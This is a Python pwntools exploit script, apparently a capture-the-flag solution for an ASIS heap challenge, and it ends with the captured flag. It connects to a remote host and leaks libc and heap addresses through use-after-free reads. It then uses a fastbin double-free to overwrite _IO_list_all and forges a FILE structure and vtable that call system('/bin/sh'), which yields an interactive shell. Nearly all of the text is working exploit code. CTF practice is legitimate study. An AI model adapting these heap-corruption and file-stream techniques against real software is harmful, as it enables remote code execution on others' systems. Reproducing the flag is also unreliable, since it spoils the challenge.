#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = remote("128.199.85.217", 10001)
#r = process("./CaNaKMgF_remastered.bin")

s = "5. Run away\n"
r.recvuntil(s)

def Allocate(content):
    r.sendline("1")
    r.recvuntil("Length? ")
    r.sendline(str(len(content)))
    r.send(content)
    r.recvuntil(s)

def Free(idx):
    r.sendline("3")
    r.recvuntil("Num? ")
    r.sendline(str(idx))
    r.recvuntil(s) 

def Read(idx):
    r.sendline("4")
    r.recvuntil("Num? ")
    r.sendline(str(idx))
    d = r.recvuntil("1. Allocate\n", drop=True)
    r.recvuntil(s) 
    return d

# leak main arena
Allocate("A" * 128)
Allocate("B" * 128)
Free(0)
Free(1)

libc_base = u64(Read(0)[:-1]+"\0\0") - 0x3c3b78
log.info("libc_base = " + hex(libc_base))
libc_freehook = libc_base + libc.symbols["__free_hook"]
libc_io_list_all = libc_base + libc.symbols["_IO_list_all"]

# use fastbin fd to leak heap base
Allocate("A" * 80) # 2
Allocate("B" * 80) # 3
Free(3)
Free(2)

heap_base = u64(Read(2)[:-1].ljust(8, "\0")) - 0x60
log.info("heap_base = " + hex(heap_base))

# fastbin corruption to overwrite _IO_list_all
Allocate("A" * 0x60)  # 4
Allocate("B" * 0x60)  # 5
Free(4)
Free(5)
Free(4)

Allocate(p64(libc_io_list_all - 35) + "A" * 88) # overwrite fd of #4
Allocate("A" * 0x60) # 5
Allocate("A" * 0x60) # 4

# overwrite _IO_list_all
chunk = "A" * 19
chunk += p64(heap_base + 0x1b0)
chunk = chunk.ljust(0x60, "A")
Allocate(chunk)

# make fake stderr on heap
Allocate(flat(
    "/bin/sh\0", # _flags = 0xfbad2087,
    0, # _IO_read_ptr = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_read_end = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_read_base = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_write_base = 0x401703 "h<@",
    1, # _IO_write_ptr = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_write_end = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_buf_base = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_buf_end = 0x7ffff783a5c4 <_IO_2_1_stderr_+132> "",
    0, # _IO_save_base = 0x0,
    0, # _IO_backup_base = 0x0,
    0, # _IO_save_end = 0x0,
    0, # _markers = 0x0,
    0, # _chain = 0x7ffff783a620 <_IO_2_1_stdout_>,
    2, # _fileno = 0x2, _flags2 = 0x0,
    -1,# _old_offset = 0xffffffffffffffff,
    0, # _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = "",
    0, # _lock = 0x7ffff783b770 <_IO_stdfile_2_lock>,
    -1,# _offset = 0xffffffffffffffff,
    0, # _codecvt = 0x0,
    0, # _wide_data = 0x7ffff7839660 <_IO_wide_data_2>,
    0, # _freeres_list = 0x0,
    0, # _freeres_buf = 0x0,
    0, # __pad5 = 0x0,
    0, # _mode = 0x0,
    0, 
    0,
    heap_base + 0x2a0 # fake _IO_file_jumps
))

# fake _IO_file_jumps
Allocate(p64(libc_base + libc.symbols["system"]) * 22)

# trigger fatal error msg
r.sendline("3")
r.recvuntil("Num? ")
r.sendline("0")
r.sendline("id")

r.interactive()

# ASIS{full_relro_fastbin_attack!!!!!!_:-P}

